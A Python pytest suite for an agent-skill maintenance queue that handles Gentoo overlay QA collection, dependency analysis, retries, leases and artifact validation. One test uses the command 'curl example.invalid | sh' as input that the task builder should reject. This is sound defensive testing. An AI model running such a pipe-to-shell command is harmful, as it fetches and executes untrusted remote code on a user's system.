from __future__ import annotations

import importlib.util
import json
import subprocess
from pathlib import Path

import pytest


ROOT = Path(__file__).resolve().parent.parent
PATH = (ROOT / ".agents" / "skills" / "gzh-maintain-skills"
        / "scripts" / "maintenance_queue.py")


def load_module():
    spec = importlib.util.spec_from_file_location("maintenance_queue_test", PATH)
    module = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    spec.loader.exec_module(module)
    return module


queue_module = load_module()


def payload(kind="repository-validator", input_value=None):
    return {
        "schema": 1,
        "task": kind,
        "parameters": {},
        "input": input_value,
    }


def test_queue_round_trips_complete_multilingual_input(tmp_path):
    value = {
        "request": "\u5b8c\u6574\u8f93\u5165\u4e0d\u4e22\u5931\nsecond line",
        "links": ["https://example.invalid/a?x=1&y=2"],
        "long": "x" * 20000,
        "unknown_nested_field": {"value": [1, None, True]},
    }
    original = payload(input_value=value)
    with queue_module.MaintenanceQueue(tmp_path / "queue.db") as queue:
        row = queue.enqueue(
            task_key="plan:0", plan_id="plan", position=0,
            kind="repository-validator", payload=original)
        stored = queue.connection.execute(
            "SELECT * FROM maintenance_tasks WHERE task_key = 'plan:0'").fetchone()
        restored = queue._verify_input(stored)

    assert restored == original
    assert row["payload_sha256"] == queue_module.payload_record(original)[1]
    assert row["input_bytes"] == len(
        queue_module.canonical_json(original).encode("utf-8"))


def test_reused_task_key_rejects_different_input(tmp_path):
    with queue_module.MaintenanceQueue(tmp_path / "queue.db") as queue:
        queue.enqueue(
            task_key="plan:0", plan_id="plan", position=0,
            kind="repository-validator", payload=payload(input_value="first"))
        with pytest.raises(ValueError, match="different complete input"):
            queue.enqueue(
                task_key="plan:0", plan_id="plan", position=0,
                kind="repository-validator", payload=payload(input_value="second"))


def test_queue_runs_in_position_order(tmp_path, monkeypatch):
    completed = queue_module.ProcessResult(
        returncode=0, stdout="pass\n", stderr="")
    monkeypatch.setattr(queue_module, "task_command",
                        lambda kind, payload, result_path: ["check", kind])
    monkeypatch.setattr(queue_module, "run_bounded", lambda *args, **kwargs: completed)

    with queue_module.MaintenanceQueue(tmp_path / "queue.db") as queue:
        queue.enqueue(
            task_key="plan:1", plan_id="plan", position=1,
            kind="diff-check", payload=payload("diff-check"))
        queue.enqueue(
            task_key="plan:0", plan_id="plan", position=0,
            kind="repository-validator", payload=payload())
        first = queue_module.execute_one(queue, "plan", "worker", tmp_path / "out")
        second = queue_module.execute_one(queue, "plan", "worker", tmp_path / "out")

    assert first["task_key"] == "plan:0"
    assert second["task_key"] == "plan:1"
    result_paths = list((tmp_path / "out").rglob("*.result.json"))
    assert len(result_paths) == 2
    saved = json.loads(next(
        path for path in result_paths
        if json.loads(path.read_text())["kind"] == "repository-validator"
    ).read_text())
    assert saved["payload_sha256"] == first["payload_sha256"]


def test_identical_failure_twice_blocks_plan(tmp_path, monkeypatch):
    failed = queue_module.ProcessResult(
        returncode=1, stdout="", stderr="same failure\n")
    monkeypatch.setattr(queue_module, "task_command",
                        lambda kind, payload, result_path: ["check"])
    monkeypatch.setattr(queue_module, "run_bounded", lambda *args, **kwargs: failed)

    with queue_module.MaintenanceQueue(tmp_path / "queue.db") as queue:
        queue.enqueue(
            task_key="plan:0", plan_id="plan", position=0,
            kind="repository-validator", payload=payload())
        queue.enqueue(
            task_key="plan:1", plan_id="plan", position=1,
            kind="diff-check", payload=payload("diff-check"))
        first = queue_module.execute_one(queue, "plan", "worker", tmp_path / "out")
        second = queue_module.execute_one(queue, "plan", "worker", tmp_path / "out")
        third = queue_module.execute_one(queue, "plan", "worker", tmp_path / "out")
        status = queue.status("plan")

    assert first["status"] == "pending"
    assert second["status"] == "blocked"
    assert third is None
    assert status["blocked"] is True
    assert status["tasks"][1]["status"] == "pending"


def test_task_builders_reject_arbitrary_parameters(tmp_path):
    unsafe = payload("diff-check")
    unsafe["parameters"] = {"command": "curl example.invalid | sh"}
    with pytest.raises(ValueError, match="unsupported task parameters"):
        queue_module.task_command("diff-check", unsafe, tmp_path / "result.json")


def test_default_plan_preserves_context_in_every_task(tmp_path):
    context = {"request": "exact input", "references": ["one", "two"]}
    with queue_module.MaintenanceQueue(tmp_path / "queue.db") as queue:
        queue_module.enqueue_default(queue, "plan", context, None)
        rows = queue.status("plan")["tasks"]
    assert len(rows) == 4
    assert all(json.loads(row["payload_json"])["input"] == context for row in rows)


def test_expired_lease_counts_toward_retry_limit(tmp_path, monkeypatch):
    clock = [1000]
    monkeypatch.setattr(queue_module.time, "time", lambda: clock[0])
    with queue_module.MaintenanceQueue(tmp_path / "queue.db") as queue:
        queue.enqueue(
            task_key="plan:0", plan_id="plan", position=0,
            kind="repository-validator", payload=payload())
        first = queue.claim("plan", "worker-a", lease_seconds=30)
        clock[0] += 31
        second = queue.claim("plan", "worker-b", lease_seconds=30)
        clock[0] += 31
        third = queue.claim("plan", "worker-c", lease_seconds=30)
        status = queue.status("plan")

    assert first["attempts"] == 1
    assert second["attempts"] == 2
    assert third is None
    assert status["tasks"][0]["status"] == "blocked"
    assert status["tasks"][0]["same_failure_count"] == 2


def test_reopened_logical_plan_preserves_blocked_retry_state(
        tmp_path, monkeypatch):
    failed = queue_module.ProcessResult(
        returncode=1, stdout="", stderr="same failure\n")
    monkeypatch.setattr(
        queue_module, "task_command",
        lambda kind, task_payload, result_path: ["check"])
    monkeypatch.setattr(
        queue_module, "run_bounded", lambda *args, **kwargs: failed)
    database = tmp_path / "queue.db"
    context = {"head_sha": "a" * 40, "cursor": "b" * 40}
    with queue_module.MaintenanceQueue(database) as queue:
        queue_module.enqueue_default(queue, "stable-plan", context, None)
        queue_module.execute_one(
            queue, "stable-plan", "worker", tmp_path / "out")
        queue_module.execute_one(
            queue, "stable-plan", "worker", tmp_path / "out")
    with queue_module.MaintenanceQueue(database) as restored:
        queue_module.enqueue_default(restored, "stable-plan", context, None)
        status = restored.status("stable-plan")
        assert restored.claim("stable-plan", "next-worker") is None
    assert status["tasks"][0]["status"] == "blocked"
    assert status["tasks"][0]["attempts"] == 2


def test_default_overlay_plan_requires_complete_repository_cursor(tmp_path):
    with queue_module.MaintenanceQueue(tmp_path / "queue.db") as queue:
        with pytest.raises(ValueError, match="adapter, repository, ref, and cursor"):
            queue_module.enqueue_default(
                queue, "plan", None, "https://example.invalid/overlay.git")
        queue_module.enqueue_default(
            queue, "plan", None, "https://example.invalid/overlay.git",
            "example-adapter", "example/overlay", "stable", "a" * 40, 80)
        task = next(
            item for item in queue.status("plan")["tasks"]
            if item["kind"] == "qa-style-collect")
    parameters = json.loads(task["payload_json"])["parameters"]
    assert parameters == {
        "overlay_url": "https://example.invalid/overlay.git",
        "adapter_id": "example-adapter",
        "canonical_repository": "example/overlay",
        "ref": "stable",
        "after_revision": "a" * 40,
        "limit": 80,
        "audit_sources": True,
    }


def test_default_qa_command_matches_collector_production_contract(tmp_path):
    with queue_module.MaintenanceQueue(tmp_path / "queue.db") as queue:
        queue_module.enqueue_default(
            queue, "plan", None, "https://example.invalid/overlay.git",
            "example-adapter", "example/overlay", "stable", "a" * 40)
        task = next(
            item for item in queue.status("plan")["tasks"]
            if item["kind"] == "qa-style-collect")
    command = queue_module.task_command(
        "qa-style-collect", json.loads(task["payload_json"]),
        tmp_path / "report.json")
    assert command[1] == str(queue_module.QA_COLLECTOR)
    assert command[command.index("--adapter-id") + 1] == "example-adapter"
    assert command[command.index("--canonical-repository") + 1] == "example/overlay"
    assert command[command.index("--after-revision") + 1] == "a" * 40
    assert "--audit-sources" in command


def test_pending_status_returns_retry_exit_code(tmp_path, monkeypatch, capsys):
    database = tmp_path / "queue.db"
    with queue_module.MaintenanceQueue(database) as queue:
        queue.enqueue(
            task_key="plan:0", plan_id="plan", position=0,
            kind="repository-validator", payload=payload())
    monkeypatch.setattr(
        queue_module.sys, "argv",
        [str(PATH), "--db", str(database), "status", "--plan-id", "plan"])
    assert queue_module.main() == 2
    assert json.loads(capsys.readouterr().out)["complete"] is False


def test_run_cli_requires_evidence_database(tmp_path):
    with pytest.raises(SystemExit):
        queue_module.parser().parse_args([
            "--db", str(tmp_path / "queue.db"),
            "run",
            "--plan-id", "plan",
            "--worker", "worker",
            "--output-dir", str(tmp_path / "out"),
        ])


def test_real_dependency_producer_is_validated_and_ingested(tmp_path):
    input_path = tmp_path / "dependency-input.json"
    input_path.write_text(json.dumps({
        "eapi": "8",
        "DEPEND": "dev-libs/openssl:=",
        "RDEPEND": "dev-libs/openssl:=",
    }))
    input_content = input_path.read_bytes()
    database = tmp_path / "state.db"
    with queue_module.MaintenanceQueue(database) as queue:
        assert queue.connection.execute(
            "PRAGMA foreign_keys").fetchone()[0] == 1
        task_payload = payload("dependency-analyze")
        task_payload["parameters"] = {
            "input": str(input_path),
            "input_sha256": queue_module.hashlib.sha256(input_content).hexdigest(),
            "input_bytes": len(input_content),
        }
        queue.enqueue(
            task_key="plan:0", plan_id="plan", position=0,
            kind="dependency-analyze", payload=task_payload)
        result = queue_module.execute_one(
            queue, "plan", "worker", tmp_path / "out", database)
        run = queue.connection.execute(
            "SELECT kind, status FROM runs").fetchone()

    assert result["status"] == "succeeded"
    assert result["artifact_path"].endswith(".artifact.json")
    assert result["result_path"].endswith(".result.json")
    assert result["artifact_path"] != result["result_path"]
    assert tuple(run) == ("dependency-analyze", "passed")


def test_producer_cannot_succeed_without_evidence_database(tmp_path):
    input_path = tmp_path / "dependency-input.json"
    input_path.write_text(json.dumps({
        "eapi": "8",
        "DEPEND": "dev-libs/openssl:=",
        "RDEPEND": "dev-libs/openssl:=",
    }))
    input_content = input_path.read_bytes()
    database = tmp_path / "state.db"
    with queue_module.MaintenanceQueue(database) as queue:
        task_payload = payload("dependency-analyze")
        task_payload["parameters"] = {
            "input": str(input_path),
            "input_sha256": queue_module.hashlib.sha256(
                input_content).hexdigest(),
            "input_bytes": len(input_content),
        }
        queue.enqueue(
            task_key="plan:0", plan_id="plan", position=0,
            kind="dependency-analyze", payload=task_payload)
        result = queue_module.execute_one(
            queue, "plan", "worker", tmp_path / "out")
        runs_table = queue.connection.execute(
            "SELECT 1 FROM sqlite_master WHERE type = 'table' AND name = 'runs'"
        ).fetchone()

    assert result["status"] == "pending"
    assert "require the queue evidence database" in result["stderr"]
    assert runs_table is None


def test_zero_exit_without_producer_artifact_is_a_failure(tmp_path, monkeypatch):
    completed = queue_module.ProcessResult(
        returncode=0, stdout="{}\n", stderr="")
    monkeypatch.setattr(queue_module, "task_command",
                        lambda kind, payload, result_path: ["producer"])
    monkeypatch.setattr(queue_module, "run_bounded", lambda *args, **kwargs: completed)
    with queue_module.MaintenanceQueue(tmp_path / "queue.db") as queue:
        task_payload = payload("dependency-analyze")
        task_payload["parameters"] = {"input": "fixture.json"}
        queue.enqueue(
            task_key="plan:0", plan_id="plan", position=0,
            kind="dependency-analyze", payload=task_payload)
        result = queue_module.execute_one(
            queue, "plan", "worker", tmp_path / "out")

    assert result["status"] == "pending"
    assert "did not create" in result["stderr"]


def test_dependency_input_mutation_after_enqueue_is_rejected(tmp_path):
    input_path = tmp_path / "dependency.json"
    input_path.write_text('{"eapi":"8","DEPEND":"dev-libs/a"}')
    content = input_path.read_bytes()
    task_payload = payload("dependency-analyze")
    task_payload["parameters"] = {
        "input": str(input_path),
        "input_sha256": queue_module.hashlib.sha256(content).hexdigest(),
        "input_bytes": len(content),
    }
    with queue_module.MaintenanceQueue(tmp_path / "queue.db") as queue:
        queue.enqueue(
            task_key="plan:0", plan_id="plan", position=0,
            kind="dependency-analyze", payload=task_payload)
        input_path.write_text('{"eapi":"8","DEPEND":"dev-libs/b"}')
        with pytest.raises(ValueError, match="changed after enqueue"):
            queue_module.task_command(
                "dependency-analyze", task_payload, tmp_path / "report.json")


def test_dependency_queue_rejects_relative_input_path(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    input_path = tmp_path / "dependency.json"
    input_path.write_text('{"eapi":"8","DEPEND":"dev-libs/a"}')
    content = input_path.read_bytes()
    task_payload = payload("dependency-analyze")
    task_payload["parameters"] = {
        "input": "dependency.json",
        "input_sha256": queue_module.hashlib.sha256(content).hexdigest(),
        "input_bytes": len(content),
    }
    with pytest.raises(ValueError, match="absolute input path"):
        queue_module.task_command(
            "dependency-analyze", task_payload, tmp_path / "report.json")


def test_local_qa_command_pins_canonical_url(tmp_path):
    task_payload = payload("qa-style-collect")
    task_payload["parameters"] = {
        "overlay_path": str(tmp_path),
        "canonical_url": "https://example.invalid/overlay.git",
        "adapter_id": "example-adapter",
        "canonical_repository": "example/overlay",
        "ref": "stable",
        "after_revision": "a" * 40,
        "audit_sources": True,
    }
    command = queue_module.task_command(
        "qa-style-collect", task_payload, tmp_path / "report.json")
    assert command[command.index("--canonical-url") + 1] == (
        "https://example.invalid/overlay.git")


@pytest.mark.parametrize("kind", ["qa-style-collect", "dependency-analyze"])
def test_producer_rejects_cross_kind_or_minimal_success(tmp_path, kind):
    artifact = tmp_path / "artifact.json"
    artifact.write_text(json.dumps({
        "schema_version": 1,
        "tool": "wrong-producer",
        "ok": True,
        "complete": True,
        "truncated": False,
    }))
    with pytest.raises(ValueError, match="required identity"):
        task_payload = payload(kind)
        task_payload["parameters"] = (
            {"input": "fixture.json"} if kind == "dependency-analyze" else {
                "overlay_url": "https://example.invalid/overlay.git",
                "adapter_id": "example-adapter",
                "canonical_repository": "example/overlay",
                "ref": "stable",
                "after_revision": "a" * 40,
                "audit_sources": True,
            })
        queue_module.validate_producer_artifact(kind, artifact, task_payload)


def test_qa_producer_must_match_queued_repository_identity(tmp_path):
    artifact = tmp_path / "artifact.json"
    report = {
        "schema_version": 1,
        "tool": "gentoo-overlay-qa-style-collector",
        "ok": True,
        "complete": True,
        "truncated": False,
        "history_complete": True,
        "primary_validation_complete": True,
        "output_complete": True,
        "scope": {
            "kind": "remote",
            "location": "https://example.invalid/other.git",
            "adapter_id": "other-adapter",
            "canonical_repository": "other/overlay",
            "requested_ref": "stable",
            "resolved_ref": "b" * 40,
        },
        "history": {
            "cursor_state": "verified",
            "complete": True,
            "truncated": False,
            "after_revision": "a" * 40,
        },
        "source_records": [{
            "id": "scope-cursor",
            "revision": "b" * 40,
            "adapter_id": "other-adapter",
            "canonical_repository": "other/overlay",
            "complete": True,
            "truncated": False,
        }],
        "candidates": [],
    }
    artifact.write_text(json.dumps(report))
    task_payload = payload("qa-style-collect")
    task_payload["parameters"] = {
        "overlay_url": "https://example.invalid/expected.git",
        "adapter_id": "expected-adapter",
        "canonical_repository": "expected/overlay",
        "ref": "stable",
        "after_revision": "a" * 40,
        "audit_sources": True,
    }
    with pytest.raises(ValueError, match="required identity"):
        queue_module.validate_producer_artifact(
            "qa-style-collect", artifact, task_payload)


def test_default_lease_exceeds_hard_task_timeout():
    assert (queue_module.TASK_TIMEOUT_SECONDS + queue_module.LEASE_GRACE_SECONDS
            > queue_module.TASK_TIMEOUT_SECONDS)


def test_bounded_process_terminates_oversized_real_output(tmp_path):
    result = queue_module.run_bounded(
        [queue_module.sys.executable, "-c",
         "import sys; sys.stdout.write('x' * 1000000)"],
        cwd=tmp_path, timeout=10, max_output_bytes=1024)
    assert result.truncated is True
    assert result.timed_out is False
    assert len(result.stdout.encode()) <= 1024
    assert result.returncode != 0


def test_markdown_preserves_task_hash_and_failure():
    report = {
        "plan_id": "plan",
        "complete": False,
        "blocked": True,
        "tasks": [{
            "position": 0,
            "kind": "source-audit",
            "status": "blocked",
            "attempts": 2,
            "payload_sha256": "a" * 64,
            "stderr": "source drift",
        }],
    }

    text = queue_module.render_markdown(report)

    assert "`source-audit`" in text
    assert "`" + "a" * 64 + "`" in text
    assert "source drift" in text


def test_queue_compaction_removes_only_old_succeeded_plans(tmp_path):
    database = tmp_path / "state.db"
    with queue_module.MaintenanceQueue(database) as queue:
        for number in range(3):
            queue.enqueue(
                task_key=f"plan-{number}:0", plan_id=f"plan-{number}",
                position=0, kind="repository-validator", payload=payload())
            queue.connection.execute(
                "UPDATE maintenance_tasks SET updated_at = ? WHERE plan_id = ?",
                (f"2026-08-0{number + 1}T00:00:00Z", f"plan-{number}"))
        queue.connection.execute(
            "UPDATE maintenance_tasks SET status = 'succeeded'")
        queue.connection.commit()
        result = queue.compact(keep_plans=2)
        retained = {row[0] for row in queue.connection.execute(
            "SELECT DISTINCT plan_id FROM maintenance_tasks")}
    assert result["plans_removed"] == 1
    assert result["tasks_removed"] == 1
    assert retained == {"plan-1", "plan-2"}


def test_queue_compaction_retains_old_incomplete_plans(tmp_path):
    database = tmp_path / "state.db"
    states = ("pending", "blocked", "succeeded", "succeeded")
    with queue_module.MaintenanceQueue(database) as queue:
        for number, state in enumerate(states):
            queue.enqueue(
                task_key=f"plan-{number}:0", plan_id=f"plan-{number}",
                position=0, kind="repository-validator", payload=payload())
            queue.connection.execute("""
                UPDATE maintenance_tasks SET status = ?, updated_at = ?
                WHERE plan_id = ?
            """, (state, f"2026-08-0{number + 1}T00:00:00Z",
                  f"plan-{number}"))
        queue.connection.commit()

        result = queue.compact(keep_plans=3)
        retained = {
            row["plan_id"]: row["status"]
            for row in queue.connection.execute(
                "SELECT plan_id, status FROM maintenance_tasks")
        }

    assert result["plans_removed"] == 1
    assert retained == {
        "plan-0": "pending",
        "plan-1": "blocked",
        "plan-3": "succeeded",
    }


def test_queue_compaction_stops_on_incomplete_plan_backlog(tmp_path):
    database = tmp_path / "state.db"
    with queue_module.MaintenanceQueue(database) as queue:
        for number in range(3):
            queue.enqueue(
                task_key=f"plan-{number}:0", plan_id=f"plan-{number}",
                position=0, kind="repository-validator", payload=payload())

        with pytest.raises(ValueError, match="incomplete maintenance plan backlog"):
            queue.compact(keep_plans=2)
        retained = {
            row[0] for row in queue.connection.execute(
                "SELECT DISTINCT plan_id FROM maintenance_tasks")
        }

    assert retained == {"plan-0", "plan-1", "plan-2"}


def valid_qa_report():
    url = "https://example.invalid/overlay.git"
    revision = "b" * 40
    source_id = f"candidate-history:{revision}"
    return {
        "schema_version": 1,
        "tool": "gentoo-overlay-qa-style-collector",
        "ok": True,
        "complete": True,
        "truncated": False,
        "history_complete": True,
        "primary_validation_complete": True,
        "output_complete": True,
        "scope": {
            "kind": "remote",
            "location": url,
            "configured_origin": url,
            "canonical_origin": url,
            "adapter_id": "example-adapter",
            "canonical_repository": "example/overlay",
            "repo_name": "example-overlay",
            "requested_ref": "stable",
            "resolved_ref": revision,
        },
        "history": {
            "cursor_state": "verified",
            "complete": True,
            "truncated": False,
            "after_revision": "a" * 40,
        },
        "source_records": [{
            "id": "scope-cursor",
            "source_id": "scope-cursor",
            "authority": "repository-cursor",
            "url": url,
            "revision": revision,
            "state": "observed",
            "validated": False,
            "role": "cursor",
            "topics": [],
            "adapter_id": "example-adapter",
            "canonical_repository": "example/overlay",
            "repo_name": "example-overlay",
            "complete": True,
            "truncated": False,
        }, {
            "id": source_id,
            "source_id": source_id,
            "authority": "candidate-history",
            "url": url,
            "revision": revision,
            "state": "observed",
            "validated": False,
            "role": "candidate",
            "topics": ["qa"],
            "adapter_id": "example-adapter",
            "canonical_repository": "example/overlay",
            "repo_name": "example-overlay",
        }],
        "candidates": [{
            "topic": "qa",
            "scope": "example/overlay",
            "adapter_id": "example-adapter",
            "authority": "candidate-history",
            "source_id": source_id,
            "source_url": url,
            "source_revision": revision,
            "policy_status": "not-established",
        }],
    }


def qa_payload():
    task_payload = payload("qa-style-collect")
    task_payload["parameters"] = {
        "overlay_url": "https://example.invalid/overlay.git",
        "adapter_id": "example-adapter",
        "canonical_repository": "example/overlay",
        "ref": "stable",
        "after_revision": "a" * 40,
        "audit_sources": True,
    }
    return task_payload


@pytest.mark.parametrize(("mutate", "message"), [
    (lambda report: report["source_records"][0].update(
        {"authority": "gentoo-standard"}), "scope cursor contract"),
    (lambda report: report["candidates"][0].update(
        {"authority": "gentoo-standard"}), "candidate provenance"),
    (lambda report: report["source_records"][1].update(
        {"role": "primary-validation"}), "candidate source contract"),
])
def test_qa_artifact_rejects_forged_cursor_or_candidate(
        tmp_path, mutate, message):
    report = valid_qa_report()
    mutate(report)
    artifact = tmp_path / "qa.json"
    artifact.write_text(json.dumps(report))
    with pytest.raises(ValueError, match=message):
        queue_module.validate_producer_artifact(
            "qa-style-collect", artifact, qa_payload())


def test_default_plan_advances_cursor_only_after_other_gates(tmp_path):
    with queue_module.MaintenanceQueue(tmp_path / "queue.db") as queue:
        queue_module.enqueue_default(
            queue, "plan", None, "https://example.invalid/overlay.git",
            "example-adapter", "example/overlay", "stable", "a" * 40)
        kinds = [task["kind"] for task in queue.status("plan")["tasks"]]
    assert kinds[-1] == "qa-style-collect"
    assert kinds.index("release-check") < kinds.index("qa-style-collect")
    assert kinds.index("tests") < kinds.index("qa-style-collect")
    assert kinds.index("diff-check") < kinds.index("qa-style-collect")


def test_open_plan_restores_original_cursor_after_evidence_advance(tmp_path):
    head_sha = "c" * 40
    context = {"iteration": {
        "head_sha": head_sha,
        "after_revision": "a" * 40,
    }}
    with queue_module.MaintenanceQueue(tmp_path / "queue.db") as queue:
        queue_module.enqueue_default(
            queue, "maintenance-old-cursor", context,
            "https://example.invalid/overlay.git", "example-adapter",
            "example/overlay", "stable", "a" * 40)
        restored = queue.find_open_plan(
            head_sha, "example-adapter", "example/overlay")

    assert restored["plan_id"] == "maintenance-old-cursor"
    assert restored["after_revision"] == "a" * 40


def test_open_plan_ignores_completed_plan(tmp_path):
    head_sha = "c" * 40
    context = {"iteration": {"head_sha": head_sha}}
    with queue_module.MaintenanceQueue(tmp_path / "queue.db") as queue:
        queue_module.enqueue_default(
            queue, "complete-plan", context,
            "https://example.invalid/overlay.git", "example-adapter",
            "example/overlay", "stable", "a" * 40)
        queue.connection.execute(
            "UPDATE maintenance_tasks SET status = 'succeeded'")
        queue.connection.commit()
        restored = queue.find_open_plan(
            head_sha, "example-adapter", "example/overlay")

    assert restored is None


def test_same_failure_ignores_volatile_paths_timestamps_and_durations(tmp_path):
    with queue_module.MaintenanceQueue(tmp_path / "queue.db") as queue:
        queue.enqueue(
            task_key="plan:0", plan_id="plan", position=0,
            kind="repository-validator", payload=payload())
        first = queue.claim("plan", "worker-a")
        queue.finish(first["task_key"], "worker-a", first["lease_token"], {
            "ok": False,
            "returncode": 1,
            "stdout": "",
            "stderr": (
                "/tmp/pytest-101/test_case failed at "
                "2026-08-04T12:00:00Z after 1.25s"),
        })
        second = queue.claim("plan", "worker-b")
        completed = queue.finish(
            second["task_key"], "worker-b", second["lease_token"], {
                "ok": False,
                "returncode": 1,
                "stdout": "",
                "stderr": (
                    "/tmp/pytest-999/test_case failed at "
                    "2026-08-05T13:30:00Z after 9.75s"),
            })

    assert completed["status"] == "blocked"
    assert completed["same_failure_count"] == 2


def test_evidence_and_queue_success_roll_back_together_on_finish_fault(
        tmp_path, monkeypatch):
    input_path = tmp_path / "dependency-input.json"
    input_path.write_text(json.dumps({
        "eapi": "8",
        "DEPEND": "dev-libs/openssl:=",
        "RDEPEND": "dev-libs/openssl:=",
    }))
    content = input_path.read_bytes()
    database = tmp_path / "state.db"
    original_finish = queue_module.MaintenanceQueue.finish

    def fail_atomic_finish(self, task_key, worker, lease_token, result, *,
                           manage_transaction=True):
        if not manage_transaction:
            raise RuntimeError("injected queue completion failure")
        return original_finish(
            self, task_key, worker, lease_token, result,
            manage_transaction=manage_transaction)

    monkeypatch.setattr(
        queue_module.MaintenanceQueue, "finish", fail_atomic_finish)
    with queue_module.MaintenanceQueue(database) as queue:
        task_payload = payload("dependency-analyze")
        task_payload["parameters"] = {
            "input": str(input_path),
            "input_sha256": queue_module.hashlib.sha256(content).hexdigest(),
            "input_bytes": len(content),
        }
        queue.enqueue(
            task_key="plan:0", plan_id="plan", position=0,
            kind="dependency-analyze", payload=task_payload)
        completed = queue_module.execute_one(
            queue, "plan", "worker", tmp_path / "out", database)
        runs = queue.connection.execute(
            "SELECT COUNT(*) AS count FROM runs").fetchone()["count"]

    assert completed["status"] == "pending"
    assert "injected queue completion failure" in completed["stderr"]
    assert runs == 0


def test_double_fault_clears_rolled_back_success_result_reference(
        tmp_path, monkeypatch):
    input_path = tmp_path / "dependency-input.json"
    input_path.write_text(json.dumps({
        "eapi": "8",
        "DEPEND": "dev-libs/openssl:=",
        "RDEPEND": "dev-libs/openssl:=",
    }))
    content = input_path.read_bytes()
    database = tmp_path / "state.db"
    original_finish = queue_module.MaintenanceQueue.finish
    original_persist = queue_module.persist_result
    writes = 0

    def fail_atomic_finish(self, task_key, worker, lease_token, result, *,
                           manage_transaction=True):
        if not manage_transaction:
            raise RuntimeError("injected queue completion failure")
        return original_finish(
            self, task_key, worker, lease_token, result,
            manage_transaction=manage_transaction)

    def fail_recovery_write(path, result):
        nonlocal writes
        writes += 1
        if writes == 3:
            raise OSError("injected recovery write failure")
        return original_persist(path, result)

    monkeypatch.setattr(
        queue_module.MaintenanceQueue, "finish", fail_atomic_finish)
    monkeypatch.setattr(queue_module, "persist_result", fail_recovery_write)
    with queue_module.MaintenanceQueue(database) as queue:
        task_payload = payload("dependency-analyze")
        task_payload["parameters"] = {
            "input": str(input_path),
            "input_sha256": queue_module.hashlib.sha256(content).hexdigest(),
            "input_bytes": len(content),
        }
        queue.enqueue(
            task_key="plan:0", plan_id="plan", position=0,
            kind="dependency-analyze", payload=task_payload)
        completed = queue_module.execute_one(
            queue, "plan", "worker", tmp_path / "out", database)
        runs = queue.connection.execute(
            "SELECT COUNT(*) AS count FROM runs").fetchone()["count"]

    assert completed["status"] == "pending"
    assert completed["result_path"] is None
    assert completed["result_sha256"] is None
    assert runs == 0
    assert not list((tmp_path / "out").rglob("*.result.json"))
